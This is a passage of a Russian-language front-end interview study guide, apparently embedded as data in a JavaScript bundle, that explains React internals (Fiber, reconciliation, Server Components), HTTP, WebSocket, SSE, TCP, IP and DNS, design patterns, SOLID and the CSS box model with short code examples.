\`\`\`

**Render-props:** паттерн для переиспользования логики — компонент управляет данными/поведением, а потребитель сам решает как их рендерить.
\`\`\`jsx
// MouseTracker знает координаты, но не знает как их показать
class MouseTracker extends React.Component {
  state = { x: 0, y: 0 };
  handleMove = (e) => this.setState({ x: e.clientX, y: e.clientY });
  render() {
    return <div onMouseMove={this.handleMove}>{this.props.render(this.state)}</div>;
  }
}

// Потребитель сам решает что рендерить с этими данными:
<MouseTracker render={({ x, y }) => <p>Курсор: {x}, {y}</p>} />
<MouseTracker render={({ x, y }) => <Avatar style={{ left: x, top: y }} />} />
\`\`\`
Задача — разделить логику (что происходит) от представления (как выглядит). До хуков это был основной способ переиспользовать логику с состоянием.

Оба паттерна в основном заменены хуками (проще, без wrapper hell). Render-props → кастомный хук. Но иногда встречаются в библиотеках (react-table, Downshift).`,score:3.5},{name:"Механизм Reconciliation",level:"4",content:`**Что запускает reconciliation:**
setState, dispatch (useReducer), обновление контекста, ререндер родителя. React ставит компонент в очередь на перерендер — не выполняет сразу.

**Batching (пакетирование обновлений):**
React 18 автоматически объединяет несколько setState в один ререндер — даже внутри setTimeout, fetch, промисов:
\`\`\`js
// Один ререндер, не три:
setTimeout(() => {
  setA(1);
  setB(2);
  setC(3);
}, 1000);
\`\`\`
До React 18 batching работал только в обработчиках событий.

**Work-in-progress tree (двойная буферизация):**
React держит два дерева: текущее (current) — то что видит пользователь, и work-in-progress — то что строится. Diffing идёт между ними. Когда всё готово — деревья меняются местами атомарно. Пользователь никогда не видит незавершённое состояние.

**Почему O(n), а не O(n³):**
Наивный diff любых двух деревьев — O(n³). React использует две эвристики которые делают это O(n):
1. Элементы разного типа никогда не сравниваются — сразу снос и пересоздание
2. key — подсказка React какой элемент списка соответствует какому

**Bailout — пропуск поддерева:**
Если React при обходе видит что props и state компонента не изменились — он пропускает всё поддерево целиком, не заходя в него:
\`\`\`js
// React.memo — bailout если props не изменились (поверхностное сравнение)
const Child = React.memo(({ value }) => <div>{value}</div>);

// Нюанс: новая функция каждый ререндер = новая ссылка = memo бесполезен
<Child onClick={() => doSomething()} /> // ❌
<Child onClick={useCallback(() => doSomething(), [])} /> // ✅
\`\`\`

**Важный нюанс — ререндер ≠ обновление DOM:**
Реакт может вызвать render-функцию компонента, посчитать VDOM и решить что реальный DOM менять не нужно — изменений нет. Ререндер дорог памятью (создание VDOM), но не обязательно дорог DOM-операциями.`,score:4},{name:"Архитектура Fiber",level:"4",content:`**Проблема до Fiber (React 15 и раньше):**
Reconciliation был синхронным рекурсивным обходом стека. Начав обход — нельзя остановиться. При большом дереве JS занимал main thread на десятки миллисекунд: анимации замерзали, ввод не отвечал.

**Что такое Fiber:**
Fiber — это новый движок reconciliation (React 16+) и одновременно структура данных. Каждый компонент в дереве — это Fiber-узел:
\`\`\`js
// Упрощённо что хранит Fiber-узел:
{
  type,          // тип компонента или DOM-тег
  props,         // текущие props
  stateNode,     // DOM-узел или экземпляр класса
  memoizedState, // state хуков (связный список)
  child,         // первый дочерний Fiber
  sibling,       // следующий сосед
  return,        // родительский Fiber
  flags,         // что нужно сделать: Update | Placement | Deletion
}
\`\`\`
Вместо рекурсии — связный список. Обход можно остановить после любого узла и продолжить позже.

**Две фазы работы:**

**1. Render фаза — прерываемая:**
React обходит Fiber-дерево, вызывает render-функции, строит work-in-progress дерево, помечает узлы флагами (Update, Placement, Deletion). Эту работу можно прервать — браузер получит управление для обработки ввода или анимации — и возобновить позже.
Поскольку фаза прерываемая, тело компонента может вызваться несколько раз за одно обновление. Именно поэтому рендер должен быть чистой функцией.

**2. Commit фаза — непрерываемая:**
React берёт список изменений (effectList) и атомарно применяет к реальному DOM. Прерывать нельзя — пользователь не должен видеть промежуточное состояние.
Три подфазы commit:
• **Before mutation** — вызываются getSnapshotBeforeUpdate
• **Mutation** — применяются DOM-изменения
• **Layout** — вызывается useLayoutEffect (синхронно после DOM, до отрисовки)

После этого браузер рисует экран, затем асинхронно вызывается useEffect.

**Приоритеты и Concurrent Mode:**
Fiber позволяет назначать приоритет обновлениям. Срочное (ввод пользователя) → выполняется немедленно. Несрочное → можно отложить:
\`\`\`js
// useTransition — помечает обновление как несрочное
const [isPending, startTransition] = useTransition();
startTransition(() => setFilter(value)); // React может прервать при вводе

// useDeferredValue — дерево с этим значением рендерится с низким приоритетом
const deferred = useDeferredValue(heavyValue);
\`\`\`

**StrictMode вызывает рендер дважды** именно из-за Fiber: проверяет что компонент идемпотентен (два вызова дают одинаковый результат). В продакшне — один раз.`,score:4},{name:"Server components",level:"4",content:`**Проблема которую решают RSC:**
При SSR компонент рендерится на сервере в HTML, но его JS-код всё равно попадает в бандл — для гидратации. Тяжёлые зависимости (markdown-парсер, date библиотека) едут клиенту даже если там они не нужны.

Server Components (RSC) — компоненты которые выполняются только на сервере. Их JS в бандл не попадает вообще. Нет гидратации — нечего гидратировать.

**Как работает:**
\`\`\`jsx
// app/page.tsx — Server Component по умолчанию в Next.js App Router
export default async function Page() {
  const posts = await db.posts.findMany(); // прямой доступ к БД — без fetch!
  return <PostList posts={posts} />;
}
\`\`\`
Компонент async — можно await прямо в теле. Данные фетчатся на сервере, клиент получает готовый результат.

**Граница server/client — директива \`'use client'\`:**
\`\`\`jsx
// ❌ Без директивы — серверный, нет интерактивности
export function StaticCard({ title }) {
  return <div>{title}</div>;
}

// ✅ С директивой — клиентский, полный React
'use client';
export function LikeButton({ postId }) {
  const [liked, setLiked] = useState(false);
  return <button onClick={() => setLiked(true)}>Like</button>;
}
\`\`\`
\`'use client'\` — граница бандла. Всё что импортирует клиентский компонент тоже попадает в бандл.

**Что можно/нельзя:**
\`\`\`
Server Component:         Client Component:
✅ async/await            ✅ useState, useEffect
✅ прямой доступ к БД     ✅ обработчики событий
✅ env переменные          ✅ браузерные API
✅ fs, секретные ключи     ✅ useContext
❌ useState/useEffect      ❌ прямой доступ к БД
❌ обработчики событий     ❌ async компонент
❌ браузерные API
\`\`\`

**RSC Payload — что летит по сети:**
Сервер отдаёт не HTML, а специальный формат (JSON-подобный). Клиентские компоненты — ссылки на JS в бандле. Серверные — готовый результат рендера. React на клиенте собирает из этого дерево.

**Composition pattern — как совмещать:**
\`\`\`jsx
// Серверный компонент передаёт children клиентскому
// Важно: children рендерится на сервере, не попадает в бандл клиента
async function Page() {
  const data = await fetchData();
  return (
    <ClientShell> {/* 'use client' */}
      <ServerContent data={data} /> {/* остаётся серверным */}
    </ClientShell>
  );
}
\`\`\`

**RSC vs SSR — разница:**
SSR — рендер на сервере + гидратация на клиенте, JS едет клиенту. RSC — рендер на сервере, JS не едет, нет гидратации. Они совместимы: страница может использовать и SSR и RSC одновременно.`,score:4}]}],Af=[{id:"network",title:"СЕТЬ",icon:"🔗",color:"#66BB6A",topics:[{name:"ip-адрес и hostName",level:"1",content:`**IP-адрес** — уникальный числовой идентификатор устройства в сети.
• **IPv4:** 192.168.1.1 (4 октета, 32 бита, ~4.3 млрд адресов)
• **IPv6:** 2001:0db8::1 (128 бит, практически неограничено)

**Hostname** — человекочитаемое имя (example.com), преобразуется в IP через DNS.

**localhost** = 127.0.0.1 (loopback). **0.0.0.0** — все интерфейсы.

**Порт** — логический адрес приложения на устройстве (80 — HTTP, 443 — HTTPS, 3000 — dev).`},{name:"Базовое понимание различий POST и GET",level:"2",content:`**GET:**
• Параметры в URL (query string)
• Кэшируется браузером
• Ограничение длины URL (~2048 символов)
• Идемпотентный (повторный запрос = тот же результат)
• Для получения данных

**POST:**
• Данные в теле запроса (body)
• НЕ кэшируется по умолчанию
• Нет ограничения размера тела
• НЕ идемпотентный
• Для создания/изменения данных

**Другие методы:** PUT (полная замена), PATCH (частичное обновление), DELETE (удаление), HEAD (только заголовки), OPTIONS (CORS preflight).`},{name:"Query-параметры",level:"2",content:"Параметры в URL после `?`, разделённые `&`:\n```\nhttps://api.com/users?page=1&limit=10&sort=name\n```\n\n**URLSearchParams API:**\n```js\nconst params = new URLSearchParams('page=1&limit=10');\nparams.get('page');      // '1'\nparams.set('page', '2');\nparams.append('filter', 'active');\nparams.toString();       // 'page=2&limit=10&filter=active'\n```\n\n**Кодирование:** спецсимволы → encodeURIComponent() / decodeURIComponent()."},{name:"REST API",level:"2",content:`**REST** — архитектурный стиль для API.

**Принципы:**
• Ресурсы идентифицируются URL: \`/users\`, \`/users/1\`
• HTTP-методы как операции: GET (read), POST (create), PUT/PATCH (update), DELETE
• **Stateless** — каждый запрос содержит всю необходимую информацию. Сервер не помнит предыдущие запросы.
• Единый интерфейс

**Stateless на примере:**
\`\`\`
// Не REST (с состоянием):
Запрос 1: "залогинься как user123"
Запрос 2: "дай мне мои заказы"  // сервер помнит кто ты

// REST (stateless):
Запрос 1: "залогинься как user123" → получаешь токен
Запрос 2: "дай заказы, вот мой токен: Bearer xxx"
\`\`\`

Преимущества stateless: масштабируемость (любой сервер обработает запрос), простота (не нужно хранить сессии), надёжность (упавший сервер не теряет состояние клиентов).

Именно поэтому JWT популярен в REST — клиент сам хранит токен и передаёт в каждом запросе.

**Хорошие практики:**
\`\`\`
GET    /users       → список пользователей
GET    /users/1     → конкретный пользователь
POST   /users       → создать пользователя
PUT    /users/1     → обновить полностью
PATCH  /users/1     → обновить частично
DELETE /users/1     → удалить
\`\`\`

**Коды ответов:** 200 OK, 201 Created, 204 No Content, 400 Bad Request, 401 Unauthorized, 403 Forbidden, 404 Not Found, 500 Internal Server Error.`},{name:"Понимание протокола HTTP",level:"2",content:`**HTTP (HyperText Transfer Protocol)** — протокол запрос-ответ.

**Запрос:**
\`\`\`
GET /index.html HTTP/1.1
Host: example.com
Accept: text/html
Cookie: session=abc
\`\`\`

**Ответ:**
\`\`\`
HTTP/1.1 200 OK
Content-Type: text/html
Set-Cookie: session=abc
Cache-Control: max-age=3600
\`\`\`

**HTTPS** — HTTP + TLS шифрование. TLS (Transport Layer Security) — протокол, который:
• Шифрует данные — перехваченный трафик нечитаем
• Аутентифицирует сервер — SSL-сертификат подтверждает что это действительно тот сервер
• Обеспечивает целостность — данные не изменены в пути

Как работает: клиент и сервер проводят TLS Handshake — договариваются об алгоритмах, обмениваются сертификатом, генерируют общий симметричный ключ. Дальше всё шифруется этим ключом.

**Коды ответов:**
• **1xx** — информационные (101 Switching Protocols — WebSocket)
• **2xx** — успех (200 OK, 201 Created, 204 No Content)
• **3xx** — редиректы (301 Moved Permanently, 302 Found, 304 Not Modified)
• **4xx** — ошибка клиента (400 Bad Request, 401 Unauthorized, 403 Forbidden, 404 Not Found)
• **5xx** — ошибка сервера (500 Internal Server Error, 503 Service Unavailable)

**Заголовки:**

**Content-Type** — формат тела запроса/ответа:
\`\`\`
application/json                — JSON
text/html; charset=utf-8        — HTML
text/plain                      — обычный текст
multipart/form-data             — загрузка файлов
application/x-www-form-urlencoded — данные формы
\`\`\`

**Authorization** — передача токена:
\`\`\`
Authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
Authorization: Basic dXNlcjpwYXNz  // base64(login:password)
\`\`\`

**Cache-Control** — управление кэшем:
\`\`\`
no-cache       // всегда проверять актуальность
no-store       // не кэшировать вообще
max-age=3600   // кэшировать 1 час
public         // можно кэшировать везде (CDN + браузер)
private        // только браузер, не CDN
\`\`\`

**Accept** — ожидаемый формат ответа:
\`\`\`
Accept: application/json
Accept: text/html
\`\`\`

**CORS** — управление доступом между доменами:
\`\`\`
// Ответ сервера:
Access-Control-Allow-Origin: https://mysite.com
Access-Control-Allow-Methods: GET, POST, PUT
Access-Control-Allow-Headers: Authorization
Access-Control-Allow-Credentials: true

// Preflight-запрос браузера:
Origin: https://mysite.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: Authorization
\`\`\`

**Set-Cookie / Cookie:**
\`\`\`
// Сервер устанавливает:
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict

// Браузер отправляет:
Cookie: session=abc123
\`\`\`

**Прочие важные:**
\`\`\`
Content-Length: 348           // размер тела в байтах
Host: api.example.com         // хост назначения
User-Agent: Mozilla/5.0...    // браузер/клиент
Referer: https://site.com     // откуда пришёл запрос
Location: /new-url            // куда редиректить (3xx)
\`\`\`

**HTTP/3:**
• Основан на **QUIC** (поверх UDP вместо TCP)
• Встроенное шифрование TLS 1.3 прямо в QUIC
• Нет head-of-line блокировки на транспортном уровне (в HTTP/2 один потерянный TCP-пакет блокирует все потоки одного соединения)
• **0-RTT** для повторных подключений — быстрее установление соединения
• **Connection migration** — соединение выживает при смене IP (переход Wi-Fi ↔ LTE, критично для мобильных)
• Поддерживается Cloudflare, Google, Fastly`},{name:"Понимание протокола HTTP/2",level:"3",content:`**Главная проблема HTTP/1.1** — один запрос на одно соединение (или очередь). Браузер открывал до 6 параллельных соединений на домен — это лимит.

**HTTP/2 решает это через:**

**1. Мультиплексирование** — несколько запросов через одно соединение параллельно:
\`\`\`
HTTP/1.1: [запрос1] → [ответ1] → [запрос2] → [ответ2]  // очередь
HTTP/2:   [запрос1] ↘
          [запрос2] → [ответ1][ответ2][ответ3]  // параллельно, одно соединение
          [запрос3] ↗
\`\`\`

**2. Сжатие заголовков (HPACK)** — в HTTP/1.1 заголовки передаются как текст при каждом запросе. HTTP/2 сжимает и кэширует — повторяющиеся не передаются.

**3. Server Push** — сервер сам отправляет ресурсы которые понадобятся клиенту:
\`\`\`
Клиент запросил index.html →
Сервер отправляет: index.html + style.css + app.js
// Не ждёт пока браузер разберёт HTML и запросит их
\`\`\`

**4. Бинарный протокол** — HTTP/1.1 текстовый, HTTP/2 бинарный → быстрее парсится, меньше ошибок.

**5. Приоритизация** — можно указать какие запросы важнее (CSS важнее картинок).

**Главный выигрыш — мультиплексирование.** Именно из-за него не нужны старые оптимизации HTTP/1.1: спрайты, domain sharding, конкатенация файлов.`},{name:"Различие Long-Polling, Websockets, Server-Sent Events",level:"3",content:`**Проблема:** HTTP — запрос/ответ. Сервер не может сам инициировать отправку данных клиенту. Нужны специальные техники для realtime.

---

**Long Polling**
Клиент отправляет запрос → сервер держит соединение открытым пока нет данных → появились данные, сервер отвечает → клиент сразу шлёт новый запрос.
\`\`\`js
async function longPoll() {
  const response = await fetch('/api/events');
  const data = await response.json();
  processData(data);
  longPoll(); // сразу новый запрос
}
\`\`\`
Минусы: новое HTTP-соединение каждый раз, задержки, неэффективно при высокой нагрузке.
Когда: простые случаи, старые браузеры, редкие обновления.

---

**WebSocket**
Полнодуплексное постоянное соединение. Клиент и сервер отправляют данные в любой момент.

Handshake — клиент отправляет HTTP-запрос с заголовком Upgrade:
\`\`\`
GET /chat HTTP/1.1
Upgrade: websocket       ← хочу переключиться на WebSocket
Connection: Upgrade
Sec-WebSocket-Key: dGhlIHNhbXBsZQ==

→ HTTP/1.1 101 Switching Protocols  ← сервер согласен
\`\`\`
После этого то же TCP-соединение используется уже для WebSocket, не HTTP.
\`\`\`js
const ws = new WebSocket('wss://site.com/chat');

ws.onopen = () => ws.send(JSON.stringify({ type: 'message', text: 'hello' }));
ws.onmessage = (e) => console.log(JSON.parse(e.data));
ws.onerror = (e) => console.error(e);
ws.onclose = (e) => console.log('закрыто', e.code);

ws.close(1000, 'работа завершена');
\`\`\`

Коды закрытия: 1000 — норма, 1001 — страница закрыта, 1006 — обрыв сети, 1011 — ошибка сервера.

Reconnect — вручную:
\`\`\`js
function connect() {
  const ws = new WebSocket('wss://site.com');
  ws.onclose = () => setTimeout(connect, 1000);
}
\`\`\`
Когда: чат, игры, реалтайм коллаборация, трейдинг.

---

**SSE (Server-Sent Events)**
Одностороннее соединение сервер → клиент. Обычный HTTP с Content-Type: text/event-stream. Автоматический reconnect встроен в браузер.
\`\`\`js
// Клиент:
const es = new EventSource('/stream');
es.onmessage = (e) => console.log(e.data);
es.addEventListener('update', (e) => console.log(e.data));
es.close();
\`\`\`
\`\`\`js
// Сервер (Node.js):
res.setHeader('Content-Type', 'text/event-stream');
res.setHeader('Cache-Control', 'no-cache');

res.write('data: привет\\n\\n');              // простое сообщение
res.write('event: update\\n');               // именованное событие
res.write('data: {"price": 100}\\n\\n');
res.write('id: 42\\n');                      // ID для reconnect
res.write('data: сообщение\\n\\n');
res.write('retry: 3000\\n\\n');              // задержка reconnect (мс)
\`\`\`
При обрыве браузер переподключается сам и отправляет Last-Event-ID — сервер знает с какого события продолжать.
Когда: лента новостей, уведомления, прогресс операции, live логи.

---

**Сравнение:**

**Long Polling** — HTTP, двустороннее, новое соединение каждый раз, reconnect вручную, простой.
**WebSocket** — WS/WSS, двустороннее, постоянное соединение, reconnect вручную, средний.
**SSE** — HTTP, только сервер→клиент, постоянное соединение, reconnect автоматически, простой.`},{name:"Базовое понимание TCP",level:"4",content:`**TCP (Transmission Control Protocol)** — протокол транспортного уровня. Обеспечивает надёжную доставку данных между двумя точками.
Интернет передаёт данные пакетами — они могут потеряться, прийти не в том порядке, задублироваться. TCP решает все эти проблемы.

**Модель OSI (упрощённо):**
\`\`\`
Приложение: HTTP, WebSocket, FTP, DNS
Транспорт:  TCP, UDP
Сеть:       IP
Канал:      Ethernet, WiFi
Физический: провода, радиоволны
\`\`\`
Каждый уровень использует нижний как транспорт. HTTP работает поверх TCP, TCP работает поверх IP.

**3-way handshake — установка соединения:**
\`\`\`
Клиент → Сервер:  SYN          (хочу соединиться, мой seq=100)
Сервер → Клиент:  SYN + ACK    (согласен, мой seq=200, подтверждаю твой 101)
Клиент → Сервер:  ACK          (принял, подтверждаю твой 201)
\`\`\`
После этого соединение установлено. Это причина задержки HTTP/1.1 — каждое новое соединение требует handshake.

**Закрытие — 4-way handshake:**
\`\`\`
Клиент → Сервер:  FIN    (я закончил отправку)
Сервер → Клиент:  ACK    (принял)
Сервер → Клиент:  FIN    (я тоже закончил)
Клиент → Сервер:  ACK    (принял, соединение закрыто)
\`\`\`

**Главные характеристики:**
• **Надёжность** — каждый пакет подтверждается через ACK. Нет подтверждения → повтор отправки.
• **Порядок** — каждый пакет имеет sequence number. Получатель собирает пакеты в правильном порядке даже если пришли вразнобой.
• **Flow Control** — получатель сообщает сколько данных готов принять (window size). Отправитель не перегружает получателя.
• **Congestion Control** — TCP снижает скорость если сеть перегружена.

**TCP vs UDP:**
**TCP** — гарантирует доставку, сохраняет порядок, медленнее, 3-way handshake, высокий overhead.
**UDP** — без гарантий, порядок не гарантирован, быстрее, нет handshake, минимальный overhead.

TCP используют: HTTP, HTTPS, WebSocket, FTP, SSH.
UDP используют: видеозвонки (WebRTC, Zoom), онлайн игры, DNS, стриминг, HTTP/3 (QUIC).

**Почему UDP для видео/игр:**
Потеря пакета в TCP → повтор → задержка. В видеозвонке лучше пропустить кадр чем ждать повтора — это создаёт заморозку. UDP просто отбрасывает потерянный пакет и продолжает.

**HTTP/3 и QUIC:**
HTTP/3 работает поверх QUIC — протокол на базе UDP но с надёжностью на уровне приложения: нет 3-way handshake, мультиплексирование без head-of-line blocking, встроенное шифрование TLS 1.3.

**Keep-Alive:**
HTTP/1.1 по умолчанию держит TCP-соединение открытым для нескольких запросов (Connection: keep-alive). Без этого каждый запрос = новый TCP handshake. HTTP/2 идёт дальше — одно соединение для всех запросов.`},{name:"Базовое понимание IP",level:"4",content:`**IP (Internet Protocol)** — протокол сетевого уровня. Отвечает за адресацию и маршрутизацию пакетов между сетями.

TCP разбивает данные на пакеты. IP доставляет каждый пакет от отправителя к получателю через цепочку роутеров. IP не гарантирует доставку — это задача TCP.

**Структура IP-пакета:**
\`\`\`
Заголовок:
  Source IP      — откуда пакет
  Destination IP — куда пакет
  TTL            — время жизни пакета
  Protocol       — что внутри (TCP=6, UDP=17)
  Checksum       — проверка целостности заголовка
Данные (payload) — TCP сегмент внутри
\`\`\`

**TTL (Time To Live):**
Каждый пакет имеет счётчик TTL (обычно 64 или 128). Каждый роутер уменьшает TTL на 1. TTL = 0 → пакет уничтожается → отправителю приходит ICMP "Time Exceeded".
Зачем: предотвращает бесконечную циркуляцию потерявшихся пакетов.
\`\`\`bash
traceroute google.com
# Отправляет пакеты с TTL=1, TTL=2, TTL=3...
# Каждый роутер отвечает — видим весь маршрут
\`\`\`

**Маршрутизация:**
\`\`\`
Твой компьютер → Домашний роутер → Роутер провайдера → ... → Сервер
\`\`\`
Каждый роутер смотрит на Destination IP и решает куда передать дальше по таблице маршрутизации. IP не знает весь путь заранее — каждый роутер решает локально.

**IPv4 vs IPv6:**
• **IPv4** — 32 бита (192.168.1.1), ~4 млрд адресов, закончились, решение: NAT
• **IPv6** — 128 бит (2001:0db8::8a2e:0370:7334), 340 ундециллионов адресов, встроенный IPSec, нет NAT

**NAT (Network Address Translation):**
Из-за нехватки IPv4 адресов несколько устройств домашней сети выходят в интернет через один публичный IP:
\`\`\`
192.168.1.2 (телефон)   ┐
192.168.1.3 (ноутбук)   ├─→ Роутер (NAT) → 85.142.10.5 (один публичный IP)
192.168.1.4 (телевизор) ┘
\`\`\`
Приватные диапазоны (не маршрутизируются в интернете):
\`\`\`
10.0.0.0/8       — большие сети
172.16.0.0/12    — средние сети
192.168.0.0/16   — домашние сети
127.0.0.0/8      — loopback (localhost)
\`\`\`

**ICMP — служебные сообщения:**
\`\`\`bash
ping google.com       # проверить доступность хоста
traceroute google.com # показать маршрут пакета
\`\`\`
Также ICMP сообщает: "Destination Unreachable" (хост недоступен), "Time Exceeded" (TTL истёк).`},{name:"Базовое понимание DNS",level:"4",content:`**DNS (Domain Name System)** — преобразует доменное имя в IP-адрес.

**Как браузер резолвит домен:**
1. Браузер проверяет свой кэш
2. ОС проверяет файл hosts (/etc/hosts)
3. Запрос к DNS резолверу провайдера
4. Резолвер проверяет свой кэш
5. Если нет — рекурсивный запрос по иерархии

**Иерархия DNS:**
\`\`\`
Root DNS серверы (.)
    ↓
TLD серверы (.com, .ru, .org)
    ↓
Authoritative серверы (google.com)
    ↓
Ответ: 142.250.185.46
\`\`\`
• **Root серверы** — знают где TLD серверы. Их всего 13 кластеров в мире.
• **TLD серверы** — знают где authoritative серверы для каждого домена.
• **Authoritative серверы** — хранят реальные DNS записи домена.

**DNS записи:**
• **A** — домен → IPv4: google.com → 142.250.185.46
• **AAAA** — домен → IPv6
• **CNAME** — псевдоним: www.google.com → google.com
• **MX** — почтовый сервер домена
• **TXT** — текстовые данные (верификация, SPF)
• **NS** — какие серверы отвечают за домен

**TTL в DNS:**
Каждая запись имеет TTL — сколько секунд её кэшировать. При смене IP нужно ждать пока TTL истечёт у всех кэшей. Поэтому при переезде сайта ставят низкий TTL заранее.

**Файл hosts:**
До DNS-запроса ОС проверяет локальный файл — используется для локальной разработки и блокировки сайтов.
\`\`\`
# /etc/hosts (Linux/Mac)
127.0.0.1       localhost
192.168.1.10    mydevserver.local
\`\`\`

**DNS over HTTPS (DoH):**
Обычный DNS — незашифрованный UDP порт 53, провайдер видит все запросы. DoH — DNS через HTTPS, зашифрован. Используют Cloudflare (1.1.1.1), Google (8.8.8.8).`}]},{id:"patterns",title:"ПАТТЕРНЫ",icon:"🧩",color:"#AB47BC",topics:[{name:"DRY, KISS, YAGNI",level:"2",content:`**DRY (Don't Repeat Yourself):** каждая часть знания имеет единственное представление. Дублирование → вынести в функцию/модуль. Но: не путай совпадение кода с дублированием логики.

**KISS (Keep It Simple, Stupid):** простое решение лучше сложного. Не усложняй без необходимости. Читаемость > краткость.

**YAGNI (You Aren't Gonna Need It):** не реализуй функционал «на будущее». Делай только то, что нужно сейчас. Преждевременная абстракция — зло.`},{name:"Навык использования и определения паттерна в коде: Observer",level:"3",content:`**Observer (Наблюдатель)** — объект уведомляет подписчиков о своих изменениях.

\`\`\`js
class EventEmitter {
  constructor() { this.listeners = {}; }
  on(event, fn) {
    (this.listeners[event] ||= []).push(fn);
  }
  off(event, fn) {
    this.listeners[event] = this.listeners[event]?.filter(f => f !== fn);
  }
  emit(event, data) {
    this.listeners[event]?.forEach(fn => fn(data));
  }
}
\`\`\`

**Где в JS:** addEventListener, RxJS, EventEmitter в Node.js, Redux store.subscribe(), Vue reactivity.`},{name:"Factory Method, Prototype, Proxy, Singleton",level:"3",content:`**Factory Method** — функция, создающая объекты без new:
\`\`\`js
function createUser(type) {
  if (type === 'admin') return new Admin();
  return new User();
}
\`\`\`

**Prototype** — создание через клонирование существующего объекта:
\`\`\`js
const proto = { greet() { return 'hi'; } };
const obj = Object.create(proto);
\`\`\`

**Proxy** — обёртка, перехватывающая операции (мы подробно разобрали в JS).

**Singleton** — один экземпляр на всё приложение:
\`\`\`js
class DB {
  static instance;
  static getInstance() {
    if (!DB.instance) DB.instance = new DB();
    return DB.instance;
  }
}
\`\`\`
В JS модули — уже singleton (экспорт кэшируется).

**Strategy** — семейство алгоритмов, взаимозаменяемых без изменения клиента:
\`\`\`js
class Sorter {
  constructor(strategy) { this.strategy = strategy; }
  sort(data) { return this.strategy(data); }
}
const quickSort = data => [...data].sort(); // упрощённо
const bubbleSort = data => { /* другой алгоритм */ };

const sorter = new Sorter(quickSort);
sorter.strategy = bubbleSort; // поменяли алгоритм без изменения Sorter
\`\`\`
Где встречается: axios interceptors, разные алгоритмы валидации, стратегии кэширования в SW.

**Command** — инкапсулирует действие как объект (поддерживает undo, очередь, логирование):
\`\`\`js
const commands = [];
const execute = (cmd) => { cmd.execute(); commands.push(cmd); };
const undo = () => commands.pop()?.undo();

execute({ execute: () => editor.insert('hello'), undo: () => editor.delete(5) });
\`\`\`
Где встречается: история операций в редакторах, Redux actions (каждый action — команда).`},{name:"Навык использования и определения паттерна в коде: Decorator",level:"3",content:`**Decorator** — оборачивает объект/функцию, добавляя поведение без изменения оригинала.

\`\`\`js
function withLogging(fn) {
  return function(...args) {
    console.log('Calling', fn.name, args);
    const result = fn.apply(this, args);
    console.log('Result:', result);
    return result;
  };
}

const add = (a, b) => a + b;
const loggedAdd = withLogging(add);
loggedAdd(2, 3); // Calling add [2,3] → Result: 5
\`\`\`

**TC39 Decorators (Stage 3):**
\`\`\`js
@logged
class MyClass { ... }
\`\`\`

**Где:** HOC в React, middleware в Express/Redux, TypeORM entity decorators.`},{name:"Навык использования и определения паттерна в коде: Dependency Injection",level:"4",content:`**DI** — зависимости передаются извне, а не создаются внутри.

\`\`\`js
// Без DI — жёсткая связь
class UserService {
  constructor() {
    this.db = new PostgresDB(); // привязан к PostgresDB
  }
}

// С DI — гибкая связь
class UserService {
  constructor(db) { // получает снаружи
    this.db = db;
  }
}
new UserService(new PostgresDB());
new UserService(new MockDB()); // для тестов!
\`\`\`

**Преимущества:** тестируемость (моки), гибкость, слабая связанность.

**Где в React:** Context как DI-контейнер, передача зависимостей через props, кастомные хуки.`}]},{id:"dev",title:"РАЗРАБОТКА ПО",icon:"⚙️",color:"#78909C",topics:[{name:"Функциональное программирование, его отличие от ООП",level:"2",content:`**ФП:**
• Данные неизменяемы (immutability)
• Чистые функции (нет побочных эффектов)
• Функции — first-class citizens
• Композиция функций
• Декларативный стиль

**ООП:**
• Данные + поведение в объектах
• Инкапсуляция, наследование, полиморфизм
• Изменяемое состояние
• Императивный стиль

**В JS используются оба:** React (ФП — компоненты как чистые функции, иммутабельный state) + классы, наследование.

**Currying** — преобразование функции с N аргументами в цепочку функций с одним:
\`\`\`js
const add = a => b => a + b;
const add5 = add(5);
add5(3); // 8 — частичное применение

// Практика: предконфигурация
const fetchWith = baseUrl => endpoint => fetch(baseUrl + endpoint);
const api = fetchWith('https://api.example.com');
api('/users'); // настроен один раз, переиспользуется
\`\`\`

**Pipe / Compose** — объединение функций в цепочку (data pipeline):
\`\`\`js
const pipe = (...fns) => x => fns.reduce((v, f) => f(v), x);
const compose = (...fns) => x => fns.reduceRight((v, f) => f(v), x);

const transform = pipe(
  str => str.trim(),
  str => str.toLowerCase(),
  str => str.replace(/s+/g, '-')
);
transform('  Hello World '); // 'hello-world'
\`\`\`

**Иммутабельность:** никогда не мутируй — возвращай новый объект/массив:
\`\`\`js
// ❌ мутация
state.count++;
arr.push(item);
// ✅ иммутабельно
{ ...state, count: state.count + 1 }
[...arr, item]
\`\`\`
Именно поэтому React не видит изменения при мутации state — ссылка та же.`},{name:"SOLID, Cohesion и Coupling",level:"3",content:`**S** — Single Responsibility: класс/модуль — одна ответственность
**O** — Open/Closed: открыт для расширения, закрыт для изменения
**L** — Liskov Substitution: подклассы заменяют родителей без поломок
**I** — Interface Segregation: много специфичных интерфейсов лучше одного общего
**D** — Dependency Inversion: зависеть от абстракций, не от деталей

**Cohesion (связность):** насколько элементы модуля связаны по смыслу. Высокая — хорошо.
**Coupling (связанность):** насколько модули зависят друг от друга. Низкая — хорошо.

**Цель:** High Cohesion + Low Coupling.`},{name:"MVC, MVVM",level:"4",content:`**MVC (Model-View-Controller):**
• **Model** — данные и бизнес-логика
• **View** — отображение (UI)
• **Controller** — обрабатывает ввод, обновляет Model и View

**MVVM (Model-View-ViewModel):**
• **Model** — данные
• **View** — UI (декларативный)
• **ViewModel** — состояние View + логика. Двустороннее связывание (data binding)

**В React:** ближе к однонаправленному потоку. Component = View + часть ViewModel. State/Redux = Model. Не чистый MVC/MVVM.

**В Vue:** ближе к MVVM (реактивное двустороннее связывание через v-model).`}]},{id:"css",title:"ВЁРСТКА",icon:"🎨",color:"#E44D26",topics:[{name:"Блочная модель",level:"1",content:`Content → Padding → Border → Margin

**content-box** (по умолчанию): width = только content. Padding + border добавляются сверху.
**border-box**: width = content + padding + border. Margin НЕ входит.

\`\`\`css
*, *::before, *::after { box-sizing: border-box; }
\`\`\`

**Margin collapsing:**
Вертикальные margins соседних блочных элементов схлопываются — берётся **больший**:
\`\`\`css
.a { margin-bottom: 20px; }
.b { margin-top: 30px; }
/* расстояние между ними = 30px, не 50px */
\`\`\`

**3 случая коллапса:**
1. Соседние siblings (братья)
2. Родитель и первый/последний ребёнок — если нет border/padding/overflow между ними
3. Пустой блок — его margin-top коллапсирует с margin-bottom

